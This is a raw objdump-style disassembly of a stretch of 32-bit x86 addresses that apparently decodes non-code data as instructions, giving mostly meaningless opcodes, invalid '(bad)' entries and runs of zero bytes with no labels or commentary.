  42c093:	dec    DWORD PTR [edx-0x5f]
  42c096:	aaa    
  42c097:	(bad)  
  42c098:	aas    
  42c099:	sahf   
  42c09a:	xor    bh,bh
  42c09c:	inc    eax
  42c09d:	test   al,0x32
  42c09f:	inc    DWORD PTR [ebp+ebp*4+0x34]
  42c0a3:	inc    DWORD PTR [ebp-0x53]
  42c0a6:	xor    al,0xff
  42c0a8:	dec    ebx
  42c0a9:	scas   eax,DWORD PTR es:[edi]
  42c0aa:	call   FWORD PTR ss:[esi-0x52]
  42c0ae:	cmp    eax,0x44ab71ff
  42c0b3:	call   FWORD PTR [ebx-0x5600b074]
  42c0b9:	jl     0x42c106
  42c0bb:	push   DWORD PTR [ebp-0x4400b07d]
  42c0c1:	mov    edx,DWORD PTR [edx-0x1]
  42c0c4:	mov    edi,0xc4ff5692
  42c0c9:	fwait
  42c0ca:	pop    ebx
  42c0cb:	dec    ebx
  42c0cd:	mov    ds:0xa9ceff63,al
  42c0d2:	gs call eax
  42c0d5:	lods   al,BYTE PTR ds:[esi]
  42c0d6:	(bad)  
  42c0d7:	(bad)  
  42c0d8:	mov    ebp,0x64ed4b88
  42c0dd:	inc    edx
  42c0de:	es jno 0x42c0e1
  42c0e1:	add    BYTE PTR [eax],al
  42c0e3:	inc    ecx
  42c0e4:	add    BYTE PTR [eax],al
  42c0e6:	add    BYTE PTR [ebx],bh
  42c0e8:	add    BYTE PTR [eax],al
  42c0ea:	add    BYTE PTR [ebx],dh
  42c0ec:	add    BYTE PTR [eax],al
  42c0ee:	add    BYTE PTR [eax+eax*1],ch
  42c0f1:	add    BYTE PTR [eax],al
  42c0f3:	and    eax,DWORD PTR [eax]
  42c0f5:	add    BYTE PTR [eax],al
  42c0f7:	push   ss
  42c0f8:	add    BYTE PTR [eax],al
  42c0fa:	add    BYTE PTR [ebx],cl
  42c0fc:	add    BYTE PTR [eax],al
  42c0fe:	add    BYTE PTR [ebx],al
	...
  42c128:	call   0x4051:0x94a43b47
  42c12f:	cli    
  42c130:	mov    DWORD PTR [ebp+edi*1-0x1],ecx
  42c134:	mov    BYTE PTR [edi+0x3a],al
  42c137:	dec    DWORD PTR [eax-0x7000c1b3]
  42c13d:	pop    ebp
  42c13e:	inc    edi
  42c13f:	push   DWORD PTR [edi+0x7d]
  42c142:	inc    esi
  42c143:	call   DWORD PTR [edx+ebp*4+0x40]
  42c147:	call   FWORD PTR [ebx-0x5a]
  42c14a:	notrack call DWORD PTR [ecx-0x68]
  42c14e:	inc    DWORD PTR ss:[edx-0x6f]
  42c152:	das    
  42c153:	push   DWORD PTR [ebx]
  42c155:	xchg   edx,eax
  42c156:	sub    edi,edi
  42c158:	xor    edx,DWORD PTR [eax-0x66c900d8]
  42c15e:	sub    bh,bh
  42c160:	cmp    BYTE PTR [ebp-0x5dc300d6],bl
  42c166:	sub    eax,0x2faa41ff
  42c16b:	dec    DWORD PTR [eax-0x54]
  42c16e:	xor    edi,edi
  42c170:	dec    ebx
  42c171:	mov    cl,0x32
  42c173:	jmp    FWORD PTR [ebx+eiz*4+0x3f]
  42c177:	jmp    DWORD PTR [esp+edi*2+0x7aadff4c]
  42c17e:	dec    ecx
  42c17f:	push   DWORD PTR [ebp-0x4600b07d]
  42c185:	mov    BYTE PTR [eax-0x1],dl
  42c188:	mov    esp,0xbfff528c
  42c18d:	xchg   ecx,eax
  42c18e:	push   ebp
  42c18f:	inc    edx
  42c191:	xchg   esi,eax
  42c192:	pop    ebx
  42c193:	inc    edi
  42c195:	lahf   
  42c196:	(bad)  
  42c197:	dec    ecx
  42c199:	mov    eax,ds:0x8abfff60
  42c19e:	dec    edi
  42c19f:	stc    
  42c1a0:	jg     0x42c1f4
  42c1a2:	das    
  42c1a3:	jns    0x42c1a5
  42c1a5:	add    BYTE PTR [eax],al
  42c1a7:	xor    DWORD PTR [eax],eax
  42c1a9:	add    BYTE PTR [eax],al
  42c1ab:	daa    
  42c1ac:	add    BYTE PTR [eax],al
  42c1ae:	add    BYTE PTR [esi],bl
  42c1b0:	add    BYTE PTR [eax],al
  42c1b2:	add    BYTE PTR [eax+eax*1],dl
  42c1b5:	add    BYTE PTR [eax],al
  42c1b7:	or     al,BYTE PTR [eax]
  42c1b9:	add    BYTE PTR [eax],al
  42c1bb:	add    al,0x0
  42c1bd:	add    BYTE PTR [eax],al
  42c1bf:	add    DWORD PTR [eax],eax
	...
  42c1e1:	add    BYTE PTR [eax],al
  42c1e3:	add    BYTE PTR [esi-0x6d4ec2b3],bl
  42c1e9:	push   eax
  42c1ea:	aas    
  42c1eb:	std    
  42c1ec:	mov    DWORD PTR [eax+0x3d],ecx
  42c1ef:	dec    DWORD PTR [edx-0x7800c4b9]
  42c1f5:	dec    ebx
  42c1f6:	cmp    al,0xff
  42c1f8:	(bad)  
  42c1f9:	dec    sp
  42c1fb:	jmp    FWORD PTR [ebp-0x7d]
  42c1fe:	inc    esp
  42c1ff:	push   DWORD PTR [ecx+eiz*4]
  42c202:	das    
  42c203:	push   DWORD PTR [ebx]
  42c205:	xchg   esp,eax
  42c206:	sub    bh,bh
  42c208:	cmp    eax,0x38ff2a88
  42c20d:	test   BYTE PTR [ecx],ch
  42c20f:	jmp    FWORD PTR [esi]
  42c211:	test   DWORD PTR [ebx],esp
  42c213:	jmp    DWORD PTR [edi]
  42c215:	mov    esp,DWORD PTR [eax]
  42c217:	jmp    DWORD PTR [esi]
  42c219:	mov    bl,BYTE PTR ds:0x1d8928ff
  42c21f:	jmp    FWORD PTR [ecx]
  42c221:	mov    DWORD PTR [edi+edi*8],ebx
  42c224:	sub    al,0x8e
  42c226:	sbb    eax,0x1f9630ff
  42c22b:	(bad)  
  42c22c:	cmp    BYTE PTR [edi-0x58c200db],bl
  42c232:	sub    bh,bh
  42c234:	dec    ebp
  42c235:	stos   BYTE PTR es:[edi],al
  42c236:	xor    edi,edi
  42c238:	xchg   ebp,eax
  42c239:	jle    0x42c281
  42c23b:	jmp    DWORD PTR [ebx-0x5500bb8f]
  42c241:	je     0x42c288
  42c243:	push   DWORD PTR [edx-0x4900b484]
  42c249:	or     BYTE PTR [ebp-0x1],0xb6
  42c24d:	or     DWORD PTR [esi-0x1],0xffffffb8
  42c251:	test   DWORD PTR [edi-0x1],ecx
  42c254:	mov    ecx,0xc0ff548a
  42c259:	xchg   edx,eax
  42c25a:	pop    esp
  42c25b:	inc    edx
  42c25d:	xchg   esi,eax
  42c25e:	pop    esi
  42c25f:	(bad)  
  42c260:	mov    esp,0x97fb4f84
  42c265:	pop    edi
  42c266:	cmp    BYTE PTR [esi+0x0],ah
  42c269:	add    BYTE PTR [eax],al
  42c26b:	adc    al,0x0
  42c26d:	add    BYTE PTR [eax],al
  42c26f:	or     eax,0x7000000
  42c274:	add    BYTE PTR [eax],al
  42c276:	add    BYTE PTR [edx],al
  42c278:	add    BYTE PTR [eax],al
  42c27a:	add    BYTE PTR [ecx],al
	...
  42c2a0:	popf   
  42c2a1:	dec    edx
  42c2a2:	cmp    ah,BYTE PTR [ebp-0x2c1b26e]
  42c2a8:	mov    WORD PTR [eax+0x3b],cs
  42c2ab:	dec    DWORD PTR [edi-0x7300c2b6]
  42c2b1:	dec    esp
  42c2b2:	notrack call DWORD PTR [edx+0x5dff4b63]
  42c2b9:	mov    BYTE PTR [ebx],bh
  42c2bb:	jmp    FWORD PTR [ebx]
  42c2bd:	xchg   esi,eax
  42c2be:	daa    
  42c2bf:	jmp    FWORD PTR [eax]
  42c2c1:	test   DWORD PTR [ebx],esp
  42c2c3:	jmp    FWORD PTR [eax]
  42c2c5:	jnp    0x42c2e8
  42c2c7:	jmp    FWORD PTR [ecx]
  42c2c9:	jp     0x42c2ea
  42c2cb:	jmp    DWORD PTR [edx]
  42c2cd:	jp     0x42c2e8
  42c2cf:	call   FWORD PTR [ecx]
  42c2d1:	jge    0x42c2e7
  42c2d3:	call   FWORD PTR [ebx]
  42c2d5:	jg     0x42c2e9
  42c2d7:	call   FWORD PTR [edx]
  42c2d9:	jle    0x42c2eb
  42c2db:	call   FWORD PTR [ebx]
  42c2dd:	jg     0x42c2ee
  42c2df:	call   FWORD PTR [edi]
  42c2e1:	jg     0x42c2f4
  42c2e3:	jmp    DWORD PTR [ecx]
  42c2e5:	adc    DWORD PTR [ecx],0xffffffff
  42c2e8:	and    cl,BYTE PTR [ebx-0x6cd700eb]
  42c2ee:	push   ss
  42c2ef:	jmp    FWORD PTR [edi+edx*4]
  42c2f2:	sbb    bh,bh
  42c2f4:	xor    BYTE PTR [esi-0x6ca400e1],bl
  42c2fa:	xor    bh,bh
  42c2fc:	xchg   esi,eax
  42c2fd:	jne    0x42c341
  42c2ff:	call   FWORD PTR [esi-0x5700c399]
  42c305:	ins    BYTE PTR es:[edi],dx
  42c306:	inc    eax
  42c307:	jmp    FWORD PTR [ebx+esi*2+0x76aeff45]
  42c30e:	dec    eax
  42c30f:	jmp    FWORD PTR [edi-0x4e00b689]
  42c315:	jp     0x42c361
  42c317:	push   DWORD PTR [edx-0x4600b384]
  42c31d:	xchg   BYTE PTR [ebp-0x1],dl
  42c320:	mov    esp,0xb4ff5a8c
  42c325:	jp     0x42c371
  42c327:	clc    
  42c328:	stos   BYTE PTR es:[edi],al
  42c329:	gs cmp eax,0x41
  42c32f:	add    al,BYTE PTR [eax]
  42c331:	add    BYTE PTR [eax],al
  42c333:	add    DWORD PTR [eax],eax
	...
  42c359:	add    BYTE PTR [eax],al
  42c35b:	add    BYTE PTR [ebp-0x6b81c7b9],bl
  42c361:	dec    ebp
  42c362:	cmp    al,0xf9
  42c364:	mov    WORD PTR [ecx+0x3c],cs
  42c367:	dec    DWORD PTR [edi-0x6f00c2b6]
  42c36d:	dec    edx
  42c36e:	notrack call DWORD PTR [edx+0x7cff4458]
  42c375:	jnp    0x42c3c0
  42c377:	jmp    FWORD PTR [esi]
  42c379:	mov    esp,DWORD PTR [edi]
  42c37b:	jmp    FWORD PTR [eax]
  42c37d:	jge    0x42c39f
  42c37f:	jmp    DWORD PTR ds:0x1fff1d73
  42c385:	jb     0x42c39e
  42c387:	call   DWORD PTR [esi]
  42c389:	outs   dx,DWORD PTR ds:[esi]
  42c38a:	ud0    edx,DWORD PTR [eax]
  42c38d:	outs   dx,DWORD PTR ds:[esi]
  42c38e:	or     edi,edi
  42c390:	adc    dh,BYTE PTR [edx+0xa]
  42c393:	call   DWORD PTR [esi]
  42c395:	jae    0x42c3a4
  42c397:	call   DWORD PTR [esi]
  42c399:	js     0x42c3a6
  42c39b:	call   DWORD PTR [edi]
  42c39d:	or     BYTE PTR [edi+edi*8],0x1b
  42c3a1:	or     DWORD PTR [esi],0x10831eff
  42c3a7:	jmp    DWORD PTR [edx]
  42c3a9:	mov    DWORD PTR [ebx],edx
  42c3ab:	jmp    DWORD PTR [esi+ecx*4]
  42c3ae:	adc    al,0xff
  42c3b0:	es nop
  42c3b2:	push   ss
  42c3b3:	jmp    DWORD PTR [edi]
  42c3b5:	xchg   ebp,eax
  42c3b6:	sbb    bh,bh
  42c3b8:	and    esp,DWORD PTR [eax-0x71aa00e8]
  42c3be:	sub    eax,0x3c6595ff
  42c3c3:	call   FWORD PTR [ebp-0x5b00c9a4]
  42c3c9:	fs cmp edi,edi
  42c3cc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42c3cd:	addr16 aas 
  42c3cf:	jmp    FWORD PTR [ecx-0x5600be95]
  42c3d5:	outs   dx,BYTE PTR ds:[esi]
  42c3d6:	inc    ebp
  42c3d7:	jmp    FWORD PTR [ecx-0x5400b990]
  42c3dd:	jb     0x42c427
  42c3df:	push   DWORD PTR [edx-0x4a00ac83]
  42c3e5:	test   BYTE PTR [ebp-0x1],dl
  42c3e8:	scas   al,BYTE PTR es:[edi]
  42c3e9:	ins    DWORD PTR es:[edi],dx
  42c3ea:	inc    ebx
  42c3eb:	in     al,dx
  42c3ec:	mov    ch,0x68
  42c3ee:	inc    ecx
  42c3ef:	push   ds
	...
  42c418:	lahf   
  42c419:	dec    eax
  42c41a:	cmp    BYTE PTR [ecx],bh
  42c41c:	cdq    
  42c41d:	dec    ebp
  42c41e:	cmp    eax,0x3d4990ed
  42c423:	call   DWORD PTR [edx-0x6c00c0b6]
  42c429:	dec    ebp
  42c42a:	inc    eax
  42c42b:	call   DWORD PTR [ebx-0x7600bbad]
  42c431:	ins    DWORD PTR es:[edi],dx
  42c432:	dec    esp
  42c433:	(bad)  
  42c434:	cmp    al,0x8d
  42c436:	sub    al,0xff
  42c438:	daa    
  42c439:	jp     0x42c45a
  42c43b:	jmp    DWORD PTR [ebx]
  42c43d:	jo     0x42c45a
  42c43f:	call   DWORD PTR [edi]
  42c441:	imul   edx,DWORD PTR [eax],0x7670fff
  42c447:	dec    DWORD PTR [edx+ebp*2]
  42c44a:	pop    es
  42c44b:	call   DWORD PTR [ebx]
  42c44d:	outs   dx,BYTE PTR ds:[esi]
  42c44e:	or     bh,bh
  42c450:	adc    al,0x6d
  42c452:	or     bh,bh
  42c454:	adc    ebp,DWORD PTR [esi+0x8]
  42c457:	call   DWORD PTR [edx+esi*2]
  42c45a:	or     bh,bh
  42c45c:	sbb    BYTE PTR [ebx+0xd],bh
  42c45f:	call   FWORD PTR [ebx]
  42c461:	jg     0x42c473
  42c463:	call   FWORD PTR [ebx]
  42c465:	jg     0x42c476
  42c467:	call   FWORD PTR [esi]
  42c469:	adc    DWORD PTR [eax],0xffffffff
  42c46c:	and    DWORD PTR [ecx-0x76df00ef],ecx
  42c472:	adc    bh,bh
  42c474:	and    bl,BYTE PTR [eax-0x60dd00ea]
  42c47a:	sbb    eax,0x269833ff
  42c47f:	inc    DWORD PTR [ecx-0x6500ca9d]
  42c485:	push   esi
  42c486:	xor    edi,edi
  42c488:	sahf   
  42c489:	push   edi
  42c48a:	xor    eax,0x365aa0ff
  42c48f:	call   FWORD PTR [edi-0x5d00c6a4]
  42c495:	pusha  
  42c496:	cmp    edi,edi
  42c498:	mov    ds:0xa3ff4064,eax
  42c49d:	gs inc ecx
  42c49f:	jmp    DWORD PTR [eax+ebp*2+0x77adff43]
  42c4a6:	dec    edi
  42c4a7:	push   DWORD PTR [edx-0x5700ae85]
  42c4ad:	pop    ebp
  42c4ae:	cmp    eax,0x3d6fb9c5
  42c4b3:	add    eax,DWORD PTR [eax]
	...
  42c4d5:	add    BYTE PTR [eax],al
  42c4d7:	add    BYTE PTR [ebp-0x6f34c5b5],bl
  42c4dd:	dec    ecx
  42c4de:	cmp    al,0xff
  42c4e0:	nop
  42c4e1:	dec    eax
  42c4e2:	cmp    eax,0x3e4a94ff
  42c4e7:	call   DWORD PTR [ecx-0x6c00c3b6]
  42c4ed:	popa   
  42c4ee:	dec    ebx
  42c4ef:	call   DWORD PTR [edi-0x79]
  42c4f2:	cmp    edi,edi
  42c4f4:	and    DWORD PTR [esi+ebx*1+0x176b20ff],eax
  42c4fb:	call   DWORD PTR [esp+eiz*2]
  42c4fe:	or     edi,edi
  42c500:	push   cs
  42c501:	fs add eax,0x66a0dff
  42c507:	call   DWORD PTR [edx]
  42c509:	outs   dx,DWORD PTR ds:[esi]
  42c50a:	or     bh,bh
  42c50c:	adc    al,0x70
  42c50e:	or     edi,edi
  42c510:	adc    BYTE PTR [eax+0x8],dh
  42c513:	call   DWORD PTR [ebx]
  42c515:	jne    0x42c521
  42c517:	call   DWORD PTR ds:0x1aff0e7c
  42c51d:	adc    DWORD PTR [eax],0xffffffff
  42c520:	sbb    al,0x81
  42c522:	adc    edi,edi
  42c524:	sbb    al,0x80
  42c526:	adc    edi,edi
  42c528:	das    
  42c529:	mov    BYTE PTR [edi],bl
  42c52b:	call   DWORD PTR [ecx-0x7a]
  42c52e:	jmp    DWORD PTR cs:[esi+0x7d]
  42c532:	xor    edi,edi
  42c534:	ins    DWORD PTR es:[edi],dx
  42c535:	jns    0x42c56a
  42c537:	push   DWORD PTR [esi+0x6f]
  42c53a:	xor    al,0xff
  42c53c:	and    DWORD PTR [ebx+0x33],0x2f508aff
  42c543:	call   DWORD PTR [edi-0x6100d0b5]
  42c549:	dec    edi
  42c54a:	xor    bh,bh
  42c54c:	popf   
  42c54d:	push   ecx
  42c54e:	xor    bh,bh
  42c550:	pushf  
  42c551:	push   ecx
  42c552:	xor    bh,bh
  42c554:	fwait
  42c555:	push   esp
  42c556:	xor    eax,0x38579bff
  42c55b:	call   FWORD PTR [esi-0x6200c4a5]
  42c561:	pop    ebp
  42c562:	cmp    eax,0x4061a0ff
  42c567:	jmp    FWORD PTR [ebx-0x5900b28e]
  42c56d:	push   0x45
  42c56f:	jmp    DWORD PTR [ebp+0x623151]
	...
  42c591:	add    BYTE PTR [eax],al
  42c593:	add    BYTE PTR [ebx-0x7588cfbf],bl
  42c599:	cmp    al,0x2a
  42c59b:	cld    
  42c59c:	test   BYTE PTR [eax+ebp*1],dh
  42c59f:	dec    DWORD PTR [eax-0x7300d7cb]
  42c5a5:	aaa    
  42c5a6:	sub    bh,bh
  42c5a8:	mov    bh,BYTE PTR [esi]
  42c5aa:	sub    eax,0x305971ff
  42c5af:	call   FWORD PTR [edx]
  42c5b1:	xchg   ecx,eax
  42c5b2:	sbb    bh,bh
  42c5b4:	adc    eax,0x10ff106e
  42c5b9:	pop    edi
  42c5ba:	or     bh,bh
  42c5bc:	or     eax,0xdff0462
  42c5c1:	imul   eax,DWORD PTR [esi],0xa7510ff
  42c5c7:	call   DWORD PTR [edi+esi*2]
  42c5ca:	or     al,0xff
  42c5cc:	adc    BYTE PTR [esi+0x9],dh
  42c5cf:	call   DWORD PTR [ecx]
  42c5d1:	jnp    0x42c5de
  42c5d3:	call   DWORD PTR [esi]
  42c5d5:	or     BYTE PTR [esi],0xff
  42c5d8:	push   ss
  42c5d9:	lea    edx,[ecx]
  42c5db:	call   DWORD PTR [ebx]
  42c5dd:	mov    WORD PTR ds:0x1a8929ff,cs
  42c5e3:	push   DWORD PTR [ebp+0x6b]
  42c5e6:	xor    eax,0x335786ff
  42c5eb:	dec    DWORD PTR [edx-0x7100d1b1]
  42c5f1:	inc    esi
  42c5f2:	sub    edi,edi
  42c5f4:	xchg   edx,eax
  42c5f5:	inc    esp
  42c5f6:	sub    bh,bh
  42c5f8:	xchg   ebp,eax
  42c5f9:	inc    esp
  42c5fa:	sub    edi,edi
  42c5fc:	xchg   edi,eax
  42c5fd:	inc    ebp
  42c5fe:	sub    al,0xff
  42c600:	call   0x2d46:0x9cff2c46
  42c607:	call   FWORD PTR [ebp-0x6400d0b7]
  42c60d:	dec    edx
  42c60e:	xor    bh,bh
  42c610:	call   0x304b:0x99ff304a
  42c617:	call   DWORD PTR [edi-0x6700ceb3]
  42c61d:	push   eax
  42c61e:	xor    al,0xff
  42c620:	cdq    
  42c621:	push   ebp
  42c622:	cmp    bh,bh
  42c624:	cwde   
  42c625:	push   esi
  42c626:	cmp    edi,edi
  42c628:	call   0x4468:0xa2ff3b5a
  42c62f:	call   FWORD PTR [ebp-0x5b0fc9a9]
  42c635:	dec    edi
  42c636:	xor    dl,BYTE PTR ds:0x0
	...
  42c654:	xchg   ecx,eax
  42c655:	cmp    ch,BYTE PTR [eax]
  42c657:	fnstcw WORD PTR [esi+0x2e]
  42c65a:	and    edi,edi
  42c65c:	sub    BYTE PTR [esi],0x23
  42c65f:	dec    DWORD PTR [eax-0x7000dbcf]
  42c665:	xor    al,0x25
  42c667:	dec    DWORD PTR [esp+edi*1+0x5158ff2a]
  42c66e:	sbb    eax,0xd8b04ff
  42c673:	dec    DWORD PTR [eax]
  42c675:	push   0x3
  42c677:	dec    DWORD PTR ds:0x10ff0567
  42c67d:	outs   dx,BYTE PTR ds:[esi]
  42c67e:	pop    es
  42c67f:	dec    DWORD PTR [esi]
  42c681:	jbe    0x42c68c
  42c683:	call   DWORD PTR [edx]
  42c685:	jge    0x42c694
  42c687:	call   DWORD PTR [edi+eax*4]
  42c68a:	or     eax,0xc8912ff
  42c68f:	call   DWORD PTR [ebx]
  42c691:	mov    ecx,DWORD PTR [edi]
  42c693:	call   DWORD PTR [edx]
  42c695:	(bad)  
  42c696:	ud0    edx,DWORD PTR [ebx]
  42c699:	xchg   ecx,eax
  42c69a:	ud0    edx,DWORD PTR [eax]
  42c69d:	cwde   
  42c69e:	adc    bh,bh
  42c6a0:	xor    BYTE PTR [ebx+0x5c90ff21],dl
  42c6a6:	cmp    edi,edi
  42c6a8:	popf   
  42c6a9:	inc    ebx
  42c6aa:	jmp    DWORD PTR cs:[edx-0x5b00d5c4]
  42c6b1:	ds sub edi,edi
  42c6b4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42c6b5:	ds sub edi,edi
  42c6b8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42c6b9:	inc    ecx
  42c6ba:	sub    al,0xff
  42c6bc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42c6bd:	inc    ecx
  42c6be:	sub    al,0xff
  42c6c0:	mov    ds:0xa0ff2d43,eax
  42c6c5:	inc    edx
  42c6c6:	sub    al,0xff
  42c6c8:	sahf   
  42c6c9:	inc    ebx
  42c6ca:	sub    eax,0x2e449cff
  42c6cf:	call   FWORD PTR [ecx-0x6700d1ba]
  42c6d5:	inc    edi
  42c6d6:	call   DWORD PTR cs:[edi-0x6900d0b9]
  42c6dd:	dec    eax
  42c6de:	xor    bh,bh
  42c6e0:	xchg   ebp,eax
  42c6e1:	dec    esp
  42c6e2:	xor    edi,edi
  42c6e4:	xchg   edx,eax
  42c6e5:	dec    esp
  42c6e6:	xor    edi,edi
  42c6e8:	nop
  42c6e9:	dec    ecx
  42c6ea:	das    
  42c6eb:	call   FWORD PTR [ebx-0x6400c2a5]
  42c6f1:	pusha  
  42c6f2:	cmp    edi,edi
  42c6f4:	sahf   
  42c6f5:	dec    edx
  42c6f6:	das    
  42c6f7:	jg     0x42c6f9
	...
  42c70d:	add    BYTE PTR [eax],al
  42c70f:	add    BYTE PTR [ecx-0x7b94d8c7],bl
  42c715:	xor    eax,0x2a7efd26
  42c71a:	and    edi,edi
  42c71c:	sub    DWORD PTR [edi],0x22
  42c71f:	dec    DWORD PTR [edx-0x6c00dbce]
  42c725:	xor    al,0x27
  42c727:	dec    DWORD PTR [ebp+esi*1+0x4381ff24]
  42c72e:	sub    edi,edi
  42c730:	sub    esp,DWORD PTR [ebp+0x13]
  42c733:	dec    DWORD PTR [eax]
  42c735:	or     DWORD PTR [ecx],0xffffffff
  42c738:	push   cs
  42c739:	ja     0x42c743
  42c73b:	call   DWORD PTR [eax]
  42c73d:	ja     0x42c748
  42c73f:	call   DWORD PTR [eax]
  42c741:	jp     0x42c74e
  42c743:	call   DWORD PTR [edi]
  42c745:	test   DWORD PTR [ecx],edx
  42c747:	call   FWORD PTR [eax]
  42c749:	xchg   ebx,eax
  42c74a:	ud0    edx,DWORD PTR [edi]
  42c74d:	fwait
  42c74e:	adc    bh,bh
  42c750:	adc    al,0x9e
  42c752:	pop    ss
  42c753:	call   DWORD PTR [edi]
  42c755:	sahf   
  42c756:	sbb    edi,edi
  42c758:	es call 0xff29:0xa12fff1b
  42c760:	ins    BYTE PTR es:[edi],dx
  42c761:	ja     0x42c79c
  42c763:	call   DWORD PTR [ebx-0x5c00d0b9]
  42c769:	cmp    al,0x29
  42c76b:	jmp    FWORD PTR [ebx-0x5300d5c5]
  42c771:	cmp    ebp,DWORD PTR [ebx]
  42c773:	jmp    FWORD PTR [ecx-0x5500d3c4]
  42c779:	cmp    eax,0x3fa8ff2a
  42c77e:	sub    edi,edi
  42c780:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42c781:	aas    
  42c782:	sub    edi,edi
  42c784:	mov    ds:0xa1ff2b3f,eax
  42c789:	aas    
  42c78a:	sub    edi,edi
  42c78c:	sahf   
  42c78d:	inc    eax
  42c78e:	sub    edi,edi
  42c790:	pushf  
  42c791:	inc    edx
  42c792:	sub    al,0xff
  42c794:	cdq    
  42c795:	inc    ecx
  42c796:	sub    al,0xff
  42c798:	xchg   edi,eax
  42c799:	inc    ebx
  42c79a:	sub    eax,0x2d4495ff
  42c79f:	call   DWORD PTR [ebx-0x6f00d1bb]
  42c7a5:	inc    esi
  42c7a6:	dec    DWORD PTR cs:[ebp-0x6e00d2bb]
  42c7ad:	dec    ebp
  42c7ae:	xor    bh,bh
  42c7b0:	cdq    
  42c7b1:	pop    esi
  42c7b2:	cmp    edi,edi
  42c7b4:	xchg   esi,eax
  42c7b5:	dec    esi
  42c7b6:	xor    ch,dh
  42c7b8:	popf   
  42c7b9:	inc    edi
  42c7ba:	cs or  eax,0x0
	...
  42c7d0:	xchg   ecx,eax
  42c7d1:	cmp    BYTE PTR [esi],ah
  42c7d3:	(bad)  
  42c7d4:	jns    0x42c801
  42c7d6:	pop    ds
  42c7d7:	(bad)  
  42c7d8:	jl     0x42c805
  42c7da:	and    bh,bh
  42c7dc:	sub    DWORD PTR [esi],0x23
  42c7df:	dec    DWORD PTR [ebx-0x6a00dad0]
  42c7e5:	xor    al,0x27
  42c7e7:	call   FWORD PTR [eax-0x7000dacc]
  42c7ed:	cmp    DWORD PTR [edi],esp
  42c7ef:	jmp    DWORD PTR [edx+0x43]
  42c7f2:	sbb    eax,0xf8e0bff
  42c7f7:	dec    DWORD PTR [esi]
  42c7f9:	xchg   edx,eax
  42c7fa:	push   cs
  42c7fb:	dec    DWORD PTR ds:0x14ff0b84
  42c801:	jl     0x42c812
  42c803:	call   FWORD PTR [ecx+edx*4]
  42c806:	adc    al,0xff
  42c808:	sbb    BYTE PTR [ebx+edx*1+0x1caf16ff],ah
  42c80f:	call   FWORD PTR [edi]
  42c811:	mov    ebx,0x8261ff2d
  42c816:	xor    al,0xff
  42c818:	sub    BYTE PTR [ecx+0x34],0xff
  42c81c:	mov    BYTE PTR [ebx+0x32],bl
  42c81f:	call   DWORD PTR [ecx-0x6400d1b8]
  42c825:	ds sub bh,bh
  42c828:	mov    al,0x43
  42c82a:	das    
  42c82b:	push   DWORD PTR [ecx-0x4f00d1bc]
  42c831:	inc    eax
  42c832:	sub    eax,0x2c3eb0ff
  42c837:	jmp    FWORD PTR [esp+edi*1+0x3cacff2c]
  42c83e:	sub    edi,edi
  42c840:	stos   BYTE PTR es:[edi],al
  42c841:	cmp    al,0x2b
  42c843:	jmp    DWORD PTR [edi-0x5a00d3c3]
  42c849:	cmp    al,0x2a
  42c84b:	jmp    DWORD PTR [ecx-0x6100d5c3]
  42c851:	cmp    eax,0x3e9bff2a
  42c856:	sub    al,0xff
  42c858:	cdq    
  42c859:	inc    eax
  42c85a:	sub    al,0xff
  42c85c:	xchg   esi,eax
  42c85d:	inc    ecx
  42c85e:	sub    eax,0x2c4194ff
  42c863:	call   DWORD PTR [eax-0x7300d4be]
  42c869:	inc    edx
  42c86a:	sub    edi,edi
  42c86c:	mov    DWORD PTR [edx+0x29],eax
  42c86f:	dec    DWORD PTR [edi-0x7400cdaf]
  42c875:	push   eax
  42c876:	xor    edi,edi
  42c878:	xchg   edi,eax
  42c879:	inc    ebx
  42c87a:	sub    eax,0x64
	...
  42c88b:	add    BYTE PTR [eax-0x7bf0d9c9],bl
  42c891:	xor    ah,BYTE PTR [edx]
  42c893:	hlt    
  42c894:	ja     0x42c8be
  42c896:	sbb    eax,0x1e2a7dff
  42c89b:	inc    DWORD PTR [esp+ebp*1+0x318cff22]
  42c8a2:	and    edi,edi
  42c8a4:	xchg   esp,eax
  42c8a5:	xor    esp,DWORD PTR [edi+edi*8]
  42c8a8:	xchg   edi,eax
  42c8a9:	xor    esp,DWORD PTR [edi+edi*8]
  42c8ac:	popf   
  42c8ad:	ds sub al,0xff
  42c8b0:	jb     0x42c8f7
  42c8b2:	and    edi,edi
  42c8b4:	pop    ss
  42c8b5:	nop
  42c8b6:	adc    eax,0x129c14ff
  42c8bb:	call   DWORD PTR [esi]
  42c8bd:	xchg   edi,eax
  42c8be:	adc    eax,0x138b17ff
  42c8c3:	call   FWORD PTR ds:0x1fff1995
  42c8c9:	lods   eax,DWORD PTR ds:[esi]
  42c8ca:	and    edi,edi
  42c8cc:	das    
  42c8cd:	mov    ch,0x38
  42c8cf:	push   DWORD PTR [ebx-0x80]
  42c8d2:	notrack call DWORD PTR [ebp-0x6100c6a7]
  42c8d9:	dec    ebp
  42c8da:	xor    bh,bh
  42c8dc:	test   al,0x4d
  42c8de:	xor    bh,bh
  42c8e0:	lods   eax,DWORD PTR ds:[esi]
  42c8e1:	push   eax
  42c8e2:	xor    bh,bh
  42c8e4:	mov    dh,0x53
  42c8e6:	aaa    
  42c8e7:	push   DWORD PTR [edi-0x4800c8b0]
  42c8ed:	dec    edi
  42c8ee:	push   DWORD PTR ss:[esi-0x4a00ccb6]
  42c8f5:	inc    edi
  42c8f6:	xor    edi,edi
  42c8f8:	mov    cl,0x42
  42c8fa:	sub    eax,0x2b3eaeff
  42c8ff:	jmp    FWORD PTR [esp+edi*1+0x3aaaff2a]
  42c906:	sub    bh,bh
  42c908:	test   al,0x3b
  42c90a:	sub    bh,bh
  42c90c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42c90d:	cmp    al,0x2a
  42c90f:	jmp    DWORD PTR [edx-0x6000d5c5]
  42c915:	cmp    ebp,DWORD PTR [ebx]
  42c917:	call   FWORD PTR [ebp+edi*1+0x3d99ff2b]
  42c91e:	sub    bh,bh
  42c920:	xchg   ebp,eax
  42c921:	ds sub edi,edi
  42c924:	xchg   ecx,eax
  42c925:	aas    
  42c926:	sub    edi,edi
  42c928:	lea    edi,[edi]
  42c92a:	sub    bh,bh
  42c92c:	mov    BYTE PTR [esi],bh
  42c92e:	sub    bh,bh
  42c930:	mov    BYTE PTR [esi+0x2b],al
